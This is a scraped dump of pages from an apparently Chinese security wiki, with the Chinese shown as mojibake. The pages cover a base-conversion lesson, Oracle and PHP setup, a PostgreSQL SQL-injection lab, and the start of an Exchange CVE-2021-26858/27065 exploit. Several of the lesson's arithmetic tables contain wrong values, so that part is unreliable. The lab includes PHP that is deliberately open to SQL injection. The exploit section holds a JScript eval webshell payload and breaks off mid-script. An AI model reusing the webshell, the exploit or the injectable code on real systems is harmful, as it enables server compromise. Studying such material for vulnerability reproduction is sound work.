¼5å¼€å§‹ï¼Œå‘å³ç§»åŠ¨7ä½ï¼Œç§»1ä½6ï¼Œç§»2ä½7ï¼Œç§»3ä½10ï¼Œç§»4ä½11ï¼Œç§»5ä½12ï¼Œç§»6ä½13ï¼Œç§»7ä½14 1+1=2 1+2=3 2+2=4 1+3=4 2+3=5 3+3=6 1+4=5 2+4=6 3+4=7 4+4=10 1+5=6 2+5=7 3+5=10 4+5=11 5+5=12 1+6=7 2+6=10 3+6=11 4+6=12 5+6=13 6+6=14 1+7=10 2+7=11 3+7=12 4+7=13 5+7=14 6+7=15 7+7=16 ä¹˜æ³•è¡¨ 2*2å°±æ˜¯2+2ï¼ŒæŸ¥è¡¨ï¼Œä»2å¼€å§‹ï¼Œå‘å³ç§»2ä½ï¼Œå¾—åˆ°4.ç„¶åç®—2Ã—3æ—¶ï¼Œåœ¨4çš„åŸºç¡€ä¸Šå†åŠ 2 1*1=2 1*2=3 2*2=4 1*3=3 2*3=6 3*3=6 1*4=4 2*4=10 3*4=11 4*4=20 1*5=5 2*5=12 3*5=14 4*5=24 5*5=31 1*6=6 2*6=14 3*6=17 4*6=30 5*6=36 6*6=44 1*7=7 2*7=16 3*7=22 4*7=34 5*7=43 6*7=52 7*7=61 æœ‰äº†è¡¨ä¹‹åï¼Œåšé¢˜ã€‚æ ¹æ®è¡¨æ¥åšé¢˜ï¼š 2+3=5 2Ã—3=6 4Ã—5=24 277+333=? 1234 277+333---- 632 236-54= åŠ æ³•è¡¨å½“å‡æ³•è¡¨ç”¨ï¼Œæ¯”å¦‚å“ªä½+3=10ï¼ŒæŸ¥ä¸€ä¸‹ï¼ŒæŸ¥å‡ºæ˜¯5 1234 236- 54---- 162 276*54=? 1234567 276 Ã— 54------ 1370 1666 ------ 20250 234/4=? 4Ã—å‡ ç¦»23æœ€è¿‘ï¼Œæ˜¯4ï¼Œ23-20=3ï¼Œ34ï¼Œ4Ã—å‡ æ˜¯34ï¼Œæ˜¯7 123456789 47 -----4)234 20 ----- 34 34 ----- 0 å°ç»“ æ¯ç§è¿›åˆ¶éƒ½æ˜¯å®Œç¾çš„ï¼Œå®ƒè‡ªèº«å°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä½“ç³»ï¼Œå¯ä»¥ç›´æ¥åšå„ç§è¿ç®—ã€‚ ç»ƒä¹  ç¼–åˆ¶7è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœ:23456+54356=? 5621-654=? 234*65=? ç­”æ¡ˆè¡¨01234561011121314151620212223242526303132333435364041424344454650515253545556åŠ æ³•è¡¨1+1=21+2=32+2=41+3=42+3=53+3=61+4=52+4=63+4=104+4=111+5=62+5=103+5=114+5=125+5=131+6=102+6=113+6=124+6=135+6=146+6=15ä¹˜æ³•è¡¨1*1=21*2=32*2=41*3=32*3=63*3=121*4=42*4=113*4=154*4=221*5=52*5=133*5=214*5=265*5=341*6=62*6=153*6=244*6=335*6=426*6=51æœ‰äº†è¡¨ä¹‹åï¼Œåšé¢˜ã€‚æ ¹æ®è¡¨æ¥åšé¢˜ï¼š23456+54356=?1234 23456+54356------111145 5621-654=?1234 5621- 654------ 4634234*65=?1234567 234Ã— 65------ 1536 2103------- 22566 ç¼–åˆ¶16è¿›åˆ¶åŠ æ³•è¡¨ï¼Œä¹˜æ³•è¡¨ï¼Œå¹¶è®¡ç®—ä¸‹é¢çš„ç»“æœ:2D4E6+CF3A6=? 5FD1-E5A=? 2CA*A5=? ç­”æ¡ˆè¡¨0123456789ABCDEF101112131415161718191A1B1C1D1E1F202122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D5E5FåŠ æ³•è¡¨1+1=21+2=32+2=41+3=42+3=53+3=61+4=52+4=63+4=74+4=81+5=62+5=73+5=84+5=95+5=A1+6=72+6=83+6=94+6=A5+6=B6+6=C1+7=82+7=93+7=A4+7=B5+7=C6+7=D7+7=E1+8=92+8=A3+8=B4+8=C5+8=D6+8=E7+8=F8+8=101+9=A2+9=B3+9=C4+9=D5+9=E6+9=F7+9=108+9=119+9=121+A=B2+A=C3+A=D4+A=E5+A=F6+A=107+A=118+A=129+A=13A+A=141+B=C2+B=D3+B=E4+B=F5+B=106+B=117+B=128+B=139+B=14A+B=15B+B=161+C=D2+C=E3+C=F4+C=105+C=116+C=127+C=138+C=149+C=15A+C=16B+C=17C+C=181+D=E2+D=F3+D=104+D=115+D=126+D=137+D=148+D=159+D=16A+D=17B+D=18C+D=19D+D=1A1+E=F2+E=103+E=114+E=125+E=136+E=147+E=158+E=169+E=17A+E=18B+E=19C+E=1AD+E=1BE+E=1C1+F=102+F=113+F=124+F=135+F=146+F=157+F=168+F=179+F=18A+F=19B+F=1AC+F=1BD+F=1CE+F=1DE+F=1Eä¹˜æ³•è¡¨1*1=11*2=22*2=41*3=32*3=63*3=91*4=42*4=83*4=C4*4=101*5=52*5=A3*5=F4*5=145*5=191*6=62*6=C3*6=124*6=185*6=1E6*6=241*7=72*7=E3*7=154*7=1C5*7=236*7=2A7*7=311*8=82*8=103*8=184*8=205*8=286*8=307*8=388*8=401*9=92*9=123*9=1B4*9=245*9=2D6*9=367*9=3F8*9=489*9=511*A=A2*A=143*A=1E4*A=285*A=326*A=3C7*A=468*A=509*A=5AA*A=641*B=B2*B=163*B=214*B=2C5*B=376*B=427*B=4D8*B=589*B=63A*B=6EB*B=791*C=C2*C=183*C=244*C=305*C=3C6*C=487*C=548*C=609*C=6CA*C=78B*C=84C*C=901*D=D2*D=1A3*D=274*D=345*D=416*D=4E7*D=5B8*D=689*D=75A*D=82B*D=8FC*D=9CD*D=A91*E=E2*E=1C3*E=2A4*E=385*E=466*E=547*E=628*E=709*E=7EA*E=8CB*E=9AC*E=A8D*E=B6E*E=C41*F=F2*F=1E3*F=2D4*F=3C5*F=4B6*F=5A7*F=698*F=789*F=87A*F=96B*F=A5C*F=B4D*F=C3E*F=D2F*F=E1æœ‰äº†è¡¨ä¹‹åï¼Œåšé¢˜ã€‚æ ¹æ®è¡¨æ¥åšé¢˜ï¼š2D4E6+CF3A6=?1234 2D4E6+CF3A6------ FC88C5FD1-E5A=?1234 5FD1- E5A------ 51772CA*A5=?1234567 2CAÃ— A5------ DF2 1BE4------- 1CC32 9è¿›åˆ¶å®šä¹‰ï¼Œç”±9ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š2ã€9ã€1ã€7ã€6ã€5ã€4ã€8ã€3ï¼Œé€¢9è¿›1ï¼šè®¡ç®—:123 + 234 = ? ç­”æ¡ˆå†™å®Œç¬¬1è¡Œï¼Œå†™åˆ°3ï¼Œå¦‚ä½•å†™ä¸‹ä¸€è¡Œï¼Ÿ123456783+1è¡¨ç¤º3å¾€åæŸ¥1ä¸ªæ•°ï¼Œæ˜¯292ç¡®å®šäº†ç¬¬2è¡Œçš„ç¬¬ä¸€ä¸ªæ•°æ˜¯ä»€ä¹ˆï¼Œç„¶åæŒ‰ç«–åˆ—æ‰¾è§„å¾‹å†™å®Œé‚£ä¸€è¡Œæ‰€ä»¥å°±æ˜¯æ¢è¡Œæ—¶è¦ç®—ä¸€ä¸‹ï¼Œå…¶ä»–çš„æ•°æŒ‰è§„å¾‹æ¥å†™ç¬¬0ä¸ªæ•°ç¬¬1ä¸ªæ•°ç¬¬2ä¸ªæ•°ç¬¬3ä¸ªæ•°ç¬¬4ä¸ªæ•°ç¬¬5ä¸ªæ•°ç¬¬6ä¸ªæ•°ç¬¬7ä¸ªæ•°ç¬¬8ä¸ªæ•°2917654839299919796959498931219111716151418137279717776757478736269616766656468635259515756555458534249414746454448438289818786858488833239313736353438339221234 123+ 234------ 725æœ€åä¸€ä½ï¼š3+4ï¼Œ4æ˜¯ç¬¬6ä¸ªæ•°ï¼Œæ‰€ä»¥å°†3å¾€æŸ¥6ä¸ªæ•°ï¼Œ3-&gt;2-&gt;9-&gt;1-&gt;7-&gt;6-&gt;5ï¼Œæ˜¯5ï¼›ä¸”è¿›1ä½å€’æ•°ç¬¬äºŒä½ï¼š2+3ï¼Œ3æ˜¯ç¬¬8ä¸ªæ•°ï¼Œæ‰€ä»¥å°†2å¾€åèµ°æŸ¥8ä¸ªæ•°ï¼Œæ˜¯3ï¼ŒåŠ ä¸Šè¿›ä½ï¼Œå†æŸ¥1ä¸ªæ•°ï¼Œæ‰€ä»¥æ˜¯2ï¼›ä¸”è¿›1ä½å€’æ•°ç¬¬ä¸‰ä½ï¼š1+2ï¼Œ2æ˜¯ç¬¬0ä¸ªæ•°ï¼Œæ‰€ä»¥å°†1å¾€åèµ°æŸ¥0ä¸ªæ•°ï¼Œæ˜¯1ï¼ŒåŠ ä¸Šè¿›ä½ï¼Œå†æŸ¥1ä¸ªæ•°ï¼Œæ‰€ä»¥æ˜¯7ã€‚ç»“æœï¼š724 10è¿›åˆ¶å®šä¹‰ï¼Œç”±10ä¸ªç¬¦å·ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š!ã€@ã€$ã€%ã€^ã€&amp;ã€*ã€Aã€Bã€Cï¼Œé€¢10è¿›1ï¼šè®¡ç®—ï¼š @$$B + %AC&amp; = ? ç­”æ¡ˆç¬¬0ä¸ªæ•°ç¬¬1ä¸ªæ•°ç¬¬2ä¸ªæ•°ç¬¬3ä¸ªæ•°ç¬¬4ä¸ªæ•°ç¬¬5ä¸ªæ•°ç¬¬6ä¸ªæ•°ç¬¬7ä¸ªæ•°ç¬¬8ä¸ªæ•°ç¬¬9ä¸ªæ•°!@$%^&amp;*ABC@!@@@$@%@^@&amp;@*@A@B@C$!$@$$%^&amp;*ABC%!%@%$%%^%&amp;%*%A%B%C%^!^@^$^%^^^&amp;^*^A^B^C&amp;!&amp;@&amp;$&amp;%&amp;^&amp;&amp;&amp;*&amp;A&amp;B&amp;C*!*@*$*%*^*&amp;***A*B*CA!A@A$A%A^A&amp;A*AAABACB!B@B$B%B^B&amp;B*BABBBCC!C@C$C%C^C&amp;C*CACBCC1234 @$$B+ %AC&amp;-------- &amp;!$%123456789æœ€åä¸€ä½ï¼šB+&amp;ï¼Œ&amp;æ˜¯ç¬¬5ä¸ªæ•°ï¼Œæ‰€ä»¥å°†Bå¾€æŸ¥5ä¸ªæ•°ï¼ŒB-&gt;C-&gt;!-&gt;@-&gt;$-&gt;%ï¼Œæ˜¯%ï¼›ä¸”è¿›1ä½å€’æ•°ç¬¬äºŒä½ï¼š$+Cï¼ŒCæ˜¯ç¬¬9ä¸ªæ•°ï¼Œæ‰€ä»¥å°†$å¾€åèµ°æŸ¥9ä¸ªæ•°ï¼Œæ˜¯@ï¼ŒåŠ ä¸Šè¿›ä½ï¼Œå†æŸ¥1ä¸ªæ•°ï¼Œæ‰€ä»¥æ˜¯$ï¼›ä¸”è¿›1ä½å€’æ•°ç¬¬ä¸‰ä½ï¼š$+Aï¼ŒAæ˜¯ç¬¬7ä¸ªæ•°ï¼Œæ‰€ä»¥å°†@å¾€åèµ°æŸ¥7ä¸ªæ•°ï¼Œæ˜¯Cï¼ŒåŠ ä¸Šè¿›ä½ï¼Œå†æŸ¥1ä¸ªæ•°ï¼Œæ‰€ä»¥æ˜¯!ï¼›ä¸”è¿›1ä½å€’æ•°ç¬¬å››ä½ï¼š@+%ï¼Œ%æ˜¯ç¬¬3ä¸ªæ•°ï¼Œæ‰€ä»¥å°†@å¾€åèµ°æŸ¥3ä¸ªæ•°ï¼Œæ˜¯^ï¼ŒåŠ ä¸Šè¿›ä½ï¼Œå†æŸ¥1ä¸ªæ•°ï¼Œæ‰€ä»¥æ˜¯&amp;ï¼›æ— è¿›ä½ã€‚ ç»“æœï¼š&amp;!$% å°ç»“ï¼š è‡ªå®šä¹‰ç¬¦å·çš„è¿›åˆ¶å†™è¡¨æ—¶ï¼Œæ¢è¡Œæ—¶å°†å½“å‰è¿™ä¸ªæ•°å­—+1ï¼Œè¿™ä¸ª1è¡¨ç¤ºå¾€åæŸ¥1ä¸ªæ•°ï¼Œç®—å‡ºä¸‹ä¸€è¡Œçš„ç¬¬1ä¸ªæ•°ã€‚å®Œäº†ï¼Œæ‰¾è§„å¾‹å¡«å®Œè¿™ä¸€è¡Œã€‚æ‰€ä»¥ï¼Œåªæ˜¯æ¢è¡Œæ—¶è¦ç®—ä¸€ä¸‹ï¼Œå…¶ä»–çš„å¯ä»¥æ‰¾è§„å¾‹å†™å®Œã€‚ è¿ç®—æ—¶ï¼Œæ¯”å¦‚ï¼šx+yï¼Œçœ‹yæ˜¯ä»£è¡¨ç¬¬å‡ ä¸ªæ•°ï¼Œå°±å°†xå¾€åæŸ¥å‡ ä¸ªæ•°ï¼Œå¾—å‡ºç»“æœï¼Œæœ‰è¿›ä½åšä¸‹ä¸€ä½è¿ç®—æ—¶å¤šæŸ¥1ä¸ªæ•°ã€‚ æ ¹æ®ä¸Šé¢çš„å°ç»“ï¼Œç¼–ç¨‹å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°èƒ½å¤Ÿè¾“å‡ºä»»æ„è¿›åˆ¶çš„ç¬¬Nä¸ªæ•°ã€‚ç»“æœ=fn(è¿›åˆ¶,ç¬¬Nä¸ªæ•°)ã€‚æ¯”å¦‚ï¼Œfn(2,100)è¿”å›1100011ï¼Œfn(8.100)è¿”å›143ï¼Œfn(16,100)è¿”å›63ã€‚ ç­”æ¡ˆè¿™æ˜¯ä¸€ä¸ªä½¿ç”¨Cè¯­è¨€ç¼–å†™çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥è¾“å‡ºä»»æ„è¿›åˆ¶çš„ç¬¬Nä¸ªæ•°ã€‚è¯·æ³¨æ„ï¼Œæˆ‘ä»¬ä»0å¼€å§‹è®¡æ•°ï¼Œæ‰€ä»¥ç¬¬Nä¸ªæ•°å®é™…ä¸Šæ˜¯N-1ã€‚12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char* fn(int base, int n) &#123; char* result = (char*) malloc(33); // ä¸ºç»“æœåˆ†é…å†…å­˜ï¼Œæœ€å¤§32ä½åŠ ä¸Šç»“æŸç¬¦&#x27;\\0&#x27; int i = 0; n--; // ä»0å¼€å§‹è®¡æ•° do &#123; int remainder = n % base; if (remainder &lt; 10) &#123; result[i++] = &#x27;0&#x27; + remainder; &#125; else &#123; result[i++] = &#x27;A&#x27; + (remainder - 10); &#125; n /= base; &#125; while (n &gt; 0); result[i] = &#x27;\\0&#x27;; // æ·»åŠ ç»“æŸç¬¦ // åè½¬å­—ç¬¦ä¸² for (int j = 0; j &lt; i / 2; j++) &#123; char temp = result[j]; result[j] = result[i - j - 1]; result[i - j - 1] = temp; &#125; return result;&#125;int main() &#123; printf(&quot;%s &quot;, fn(2, 100)); // è¾“å‡º: 1100011 printf(&quot;%s &quot;, fn(8, 100)); // è¾“å‡º: 143 printf(&quot;%s &quot;, fn(16, 100)); // è¾“å‡º: 63 return 0;&#125;è¿™ä¸ªå‡½æ•°é¦–å…ˆå°†æ•°å­—è½¬æ¢ä¸ºç»™å®šçš„åŸºæ•°ï¼Œç„¶åå°†ç»“æœå­˜å‚¨åœ¨å­—ç¬¦ä¸²ä¸­ã€‚ç„¶åï¼Œå®ƒåè½¬å­—ç¬¦ä¸²ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ä»æœ€ä½æœ‰æ•ˆä½å¼€å§‹è®¡ç®—çš„ã€‚æœ€åï¼Œå®ƒè¿”å›ç»“æœå­—ç¬¦ä¸²ã€‚è¯·æ³¨æ„ï¼Œè¿™ä¸ªå‡½æ•°å‡è®¾ä½ æƒ³è¦çš„æ˜¯å¤§å†™å­—æ¯æ¥è¡¨ç¤ºå¤§äº9çš„æ•°å­—ï¼ˆå¯¹äº16è¿›åˆ¶ï¼‰ã€‚å¦‚æœä½ æƒ³è¦å°å†™å­—æ¯ï¼Œä½ å¯ä»¥åœ¨ä»£ç ä¸­åšé€‚å½“çš„ä¿®æ”¹ã€‚ äºŒè¿›åˆ¶çš„ç®€å†™å½¢å¼ å¯ä»¥ç†è§£ä¸ºåå…­è¿›åˆ¶ç¬¦å·å°±æ˜¯4ä½äºŒè¿›åˆ¶æ•°çš„ç¬¦å·æ›¿æ¢ï¼Œè€Œä¸æ˜¯é€ä½2çš„å‡ æ¬¡æ–¹+2çš„å‡ æ¬¡æ–¹ç®—å‡ºæ¥ã€‚ å¯¹äºäºŒè¿›åˆ¶å’Œåå…­è¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ï¼Œè¦ç†Ÿç»ƒã€‚"},{"title":"Oracle","path":"/wiki/sql_injection_env/Oracle.html","content":"phpè¿æ¥Oracleæ•°æ®åº“ å‚è€ƒï¼šhttps://blog.csdn.net/qq_35372797/article/details/120791792 çœ‹è‡ªå·±ç”¨çš„phpç‰ˆæœ¬ 123&lt;?phpphpinfo(); ?&gt; å› ä¸ºè¦æ ¹æ®phpçš„ä½æ•°ã€ç‰ˆæœ¬ï¼Œå®‰è£…ç›¸åº”çš„Oracleï¼Œç„¶åå°†Oracleçš„ä¸¤ä¸ªdllæ‹·åˆ°phpç‰ˆæœ¬çš„æ ¹ç›®å½•ä¸‹ ä¸€å¼€å§‹æˆ‘çœ‹ä¸Šé¢çš„å›¾ä»¥ä¸ºè£…Oracleçš„10å’Œ11éƒ½å¯ä»¥ï¼Œç„¶åè£…äº†10ï¼Œè¯•äº†ä¼šæç¤ºæ‰¾ä¸åˆ°ociæ¨¡å— Oracleæ•°æ®åº“ä¸‹è½½åœ°å€https://www.oracle.com/database/technologies/instant-client/downloads.html æˆ‘ä¸‹çš„Version 10.2.0.5ï¼ŒInstant Client Package - Basic å› ä¸ºè¦ç™»å½•ï¼Œæ‰¾åˆ«äººæ”¶é›†çš„https://www.jianshu.com/p/e192e251490b åé¢çœ‹åˆ°è¿™ä¸ªhttp://pecl.php.net/package/oci8/1.4.10/windows The current OCI8 extension can be linked with Oracle Client libraries from Oracle Database 11.2 or later. (OCI8 3.0 and earlier can be linked with 10g or later). The Oracle Client libraries are in the free Oracle Instant Client from https://www.oracle.com/database/technologies/instant-client.html. They are also included in your database installation. æ‰€ä»¥è¦è£…Oracle11.2 or laterï¼Œæˆ‘ä¸‹äº†11.2.0.4.0çš„å‹ç¼©åŒ…ï¼Œè§£å‹åå¯¹instantclientæ·»åŠ ç¯å¢ƒå˜é‡ï¼Œå°†é‡Œè¾¹çš„ä¸¤ä¸ªdllï¼ˆoci.dll å’Œ oraooci12.dll (è¿™é‡Œä¹Ÿæœ‰å¯èƒ½æ˜¯oraooci11.dll æˆ–å…¶ä»–æ•°å­—)ï¼‰æ‹·åˆ°phpç‰ˆæœ¬çš„æ ¹ç›®å½•ä¸‹ ä¿®æ”¹php.iniï¼Œå»æ‰ä¸‰ä¸ªæ³¨é‡Š å¦‚æœextæ–‡ä»¶å¤¹ä¸­ç¼ºå°‘dllï¼Œè¦å»http://pecl.php.net/package/oci8ä¸‹è½½ã€‚ é‡å¯apacheï¼Œå†æ¬¡æŸ¥çœ‹phpinfoï¼Œæœç´¢oci8ï¼Œèƒ½çœ‹åˆ°ä¸‹å›¾ è¦ç‚¹ ä¸»è¦è¿˜æ˜¯Oracleçš„ç‰ˆæœ¬è¦ä¸‹å¯¹ï¼Œetxæ–‡ä»¶å¤¹é‡Œçš„dllé»˜è®¤éƒ½æœ‰çš„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸ç”¨åœ¨å•ç‹¬ä¸‹è½½ Oracleæ•°æ®åº“å®‰è£… å®‰è£…åŒ…é“¾æ¥https://blog.csdn.net/Keith_LH/article/details/126115278 å®‰è£…è¿‡ç¨‹https://www.cnblogs.com/lrc123/p/15816083.html å…¨å±€æ•°æ®åº“åorcl ç®¡ç†å£ä»¤Oracle123 scoot/tiger oracleå®‰è£…è¿‡ç¨‹å¿˜è®°é…ç½®å£ä»¤ç®¡ç† å¯åŠ¨OracleæœåŠ¡å¹¶å¯åŠ¨ç›‘å¬https://blog.csdn.net/cojn52/article/details/115613206 Oracleçš„è¿æ¥ç›‘å¬ä¸æœ¬åœ°ç½‘ç»œé…ç½®https://blog.csdn.net/qq_36835560/article/details/96978673 åˆ›å»ºæ•°æ®åº“https://www.modb.pro/db/38320 å…¨å±€æ•°æ®åº“åorcl1 SYS SYSTEM DBSNMP SYSMAN ç®¡ç†å£ä»¤éƒ½æ˜¯ï¼štiger æµ‹è¯•phpèƒ½å¦è¿æ¥Oracle 12345678910&lt;?php$conn = oci_connect(&#x27;ç”¨æˆ·å&#x27;, &#x27;å¯†ç &#x27;, &#x27;è¿œç¨‹æ•°æ®åº“å(eg.//192.168.1.133/orcl)&#x27;);if (!$conn) &#123; $e = oci_error(); print htmlentities($e[&#x27;message&#x27;]); exit;&#125;else &#123; echo &quot;è¿æ¥oracleæˆåŠŸï¼&quot;;&#125;?&gt;"},{"title":"PostgreSQL","path":"/wiki/sql_injection_env/PostgreSQL.html","content":"ç¯å¢ƒæ­å»º æ•°æ®åº“ æ•°æ®åº“æ­å»ºå¯ä»¥ç”¨dockeræˆ–ä¼ ç»Ÿçš„å®‰è£…åŒ…æ–¹å¼å®‰è£… dockerä¼ ç»Ÿæ–¹å¼å®‰è£… æ ‡é¢˜ é“¾æ¥ å¤‡æ³¨ PostgreSQLæ³¨å…¥å…¥é—¨ https://macchiato.ink/web/web_security/PostgreSQL_Inject/ docker+phpstudyæ­å»ºæ•™ç¨‹ 12docker pull postgres:9.6.20docker run -e POSTGRES_PASSWORD=123456 -p 5432:5432 -d postgres:9.6.20windowsä¸Šå®‰è£…postgreSQL æ ‡é¢˜ é“¾æ¥ å¤‡æ³¨ PostgreSQL Server v9.6.20 å®˜æ–¹é•œåƒæºä¸‹è½½ https://renwole.com/archives/2392 å®‰è£…åŒ…ä¸‹è½½ Windows 10å¹³å°å®‰è£…PostgreSQL 14.2è¯¦ç»†æ•™ç¨‹ https://zhuanlan.zhihu.com/p/484450913 å®‰è£…æ•™ç¨‹ æ•°æ®åº“è¿æ¥å·¥å…·ï¼špsqlå‘½ä»¤è¡Œè¿æ¥å·¥å…·ï¼Œæˆ–PgAdmin åˆ›å»ºç›¸å…³æ•°æ® å¦‚ç”¨psqlå‘½ä»¤è¡Œè¿æ¥å·¥å…·å°†å¦‚ä¸‹sqlè„šæœ¬å¯¼å…¥ 123456789101112131415161718192021222324252627DROP TABLE IF EXISTS &quot;public&quot;.&quot;flag&quot;;CREATE TABLE &quot;public&quot;.&quot;flag&quot; ( &quot;flag&quot; varchar(255) COLLATE &quot;pg_catalog&quot;.&quot;default&quot;);INSERT INTO &quot;public&quot;.&quot;flag&quot; VALUES (&#x27;flag&#123;123&#125;&#x27;);DROP TABLE IF EXISTS &quot;public&quot;.&quot;users&quot;;CREATE TABLE &quot;public&quot;.&quot;users&quot; ( &quot;id&quot; int4 NOT NULL, &quot;username&quot; varchar(255) COLLATE &quot;pg_catalog&quot;.&quot;default&quot;, &quot;password&quot; varchar(255) COLLATE &quot;pg_catalog&quot;.&quot;default&quot;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (1, &#x27;admin&#x27;, &#x27;admin&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (2, &#x27;test&#x27;, &#x27;test&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (3, &#x27;sysadmin&#x27;, &#x27;123456&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (4, &#x27;root&#x27;, &#x27;root&#x27;);INSERT INTO &quot;public&quot;.&quot;users&quot; VALUES (5, &#x27;administrator&#x27;, &#x27;administrator&#x27;);ALTER TABLE &quot;public&quot;.&quot;users&quot; ADD CONSTRAINT &quot;users_pkey&quot; PRIMARY KEY (&quot;id&quot;); æ–¹å¼ä¸€ï¼šåœ¨shellä¸Šç”¨qsqlå¯¼å…¥sqlæ–‡ä»¶æ–¹å¼äºŒï¼šè¿æ¥æ•°æ®åº“åå¯¼å…¥1psql -h &lt;ip&gt; -p 5432 -U postgres -W -d postgres -a -f path_to_your_file.sql1psql -h localhost -p 5432 -U postgres -W å½“æç¤ºè¾“å…¥å¯†ç æ—¶ï¼Œè¾“å…¥åœ¨è¿è¡ŒDockerå®¹å™¨æ—¶è®¾ç½®çš„å¯†ç ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯123456ï¼‰ã€‚ \\iä»æ–‡ä»¶ä¸­æ‰§è¡Œå‘½ä»¤ 1\\i &#x27;C:\\\\Users\\\\win10_1809_pro\\\\Desktop\\\\test\\\\postgresql.sql&#x27; æ£€éªŒ åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“ 1\\l 1\\list 1SELECT * FROM &quot;public&quot;.&quot;users&quot;; phpè„šæœ¬ å†™ä¸€ä¸ªpgsql.phpæ”¾åœ¨phpstudyçš„WWWç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶å¤¹ 123456789101112131415161718192021&lt;?php $host = &quot;host=192.168.147.138&quot;; $port = &quot;port=5432&quot;; $dbname = &quot;dbname=postgres&quot;; $credentials = &quot;user=postgres password=123456&quot;; $db = pg_connect( &quot;$host $port $dbname $credentials&quot; ); $sql =&quot;select * from users where id = &quot;.$_GET[&#x27;id&#x27;]; $ret = pg_query($db, $sql); if(!$ret)&#123; echo pg_last_error($db); exit; &#125; while($row = pg_fetch_row($ret))&#123; echo &quot;username = &quot;. $row[1] .&quot;&lt;/br&gt;&quot;; echo &quot;password = &quot;. $row[2] .&quot;&lt;/br&gt;&quot;; &#125; pg_close($db);?&gt; è®¿é—®ï¼Œç„¶åå¯ä»¥å¼€å§‹ç»ƒä¹ äº† 1http://192.168.147.138/postgresql/index.php?id=1"},{"title":"Exchange CVE-2021-26858/CVE-2021-27065","path":"/wiki/vuln_reproduction/Exchange_CVE-2021-26858_CVE-2021-27065.html","content":"æ¼æ´ä¿¡æ¯ åç§°/ç¼–å· å½±å“èŒƒå›´ å·²å¤ç°ç‰ˆæœ¬ æµ‹ä¸é€šçš„ç‰ˆæœ¬ CVE-2021-26858/CVE-2021-27065 CVE-2021-27065/CVE-2021-26855/CVE-2021-26858ï¼šExchange Server 2019 Cumulative Update 8Exchange Server 2019 Cumulative Update 7Exchange Server 2016 Cumulative Update 19Exchange Server 2016 Cumulative Update 18Exchange Server 2013 Cumulative Update 23 Exchange Server 2016 Cumulative Update 18 Exchange Server 2019 Cumulative Update 9 è¿™æ˜¯ä¸¤ä¸ªCVEé…åˆå®ç°çš„è¿œç¨‹å†™shellï¼ŒRCE æ¼æ´å¤ç° ç¯å¢ƒæ‹“æ‰‘ è™šæ‹Ÿæœº ip Exchange 2016 cu18 192.168.147.141 æ”»å‡»æœº Exchangeç¯å¢ƒæ­å»ºå‚è€ƒå‚è€ƒé“¾æ¥ä¸­çš„Exchange CVE-2021-26855 RCEæ¼æ´å¤ç°æˆ–wiki-Windowsä¸‹çš„ç¯å¢ƒæ­å»º-Exchangeæ­å»ºæ–‡ç« ã€‚æœ¬æ¬¡å¤ç°æ˜¯ä½¿ç”¨server2016æ­å»ºDCï¼Œç„¶ååœ¨è¯¥DCä¸Šå®‰è£…Exchange2016ï¼ŒåŸŸåæ˜¯exchange.local é¶æœºç¯å¢ƒè¦æ±‚ å®‰è£…å®Œï¼Œè‡³å°‘éœ€è¦åŸŸ/administratorç”¨æˆ·ç™»å½•è¿‡https://127.0.0.1/ecp/ã€‚ æ­¤å¤–ï¼Œexpä¼šè‡ªåŠ¨fuzzï¼Œexpä¸­fuzz_emailæ•°ç»„çš„ç”¨æˆ·åï¼Œç”¨æˆ·å@suffixé‚®ç®±çš„ä¿¡æ¯ å¤ç°è¿‡ç¨‹ ä¸‹è½½exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240# -*- coding: utf-8 -*-import requestsfrom urllib3.exceptions import InsecureRequestWarningimport randomimport stringimport argparseimport sysrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)fuzz_email = [&#x27;administrator&#x27;, &#x27;webmaste&#x27;, &#x27;support&#x27;, &#x27;sales&#x27;, &#x27;contact&#x27;, &#x27;admin&#x27;, &#x27;test&#x27;, &#x27;test2&#x27;, &#x27;test01&#x27;, &#x27;test1&#x27;, &#x27;guest&#x27;, &#x27;sysadmin&#x27;, &#x27;info&#x27;, &#x27;noreply&#x27;, &#x27;log&#x27;, &#x27;no-reply&#x27;]proxies = &#123;&#125;user_agent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;shell_path = &quot;Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\test11.aspx&quot;shell_absolute_path = &quot;\\\\\\\\127.0.0.1\\\\c$\\\\%s&quot; % shell_path# webshell-é©¬å­å†…å®¹shell_content = &#x27;&lt;script language=&quot;JScript&quot; runat=&quot;server&quot;&gt; function Page_Load()&#123;/**/eval(Request[&quot;code&quot;],&quot;unsafe&quot;);&#125;&lt;/script&gt;&#x27;final_shell = &quot;&quot;def id_generator(size=6, chars=string.ascii_lowercase + string.digits): return &#x27;&#x27;.join(random.choice(chars) for _ in range(size))if 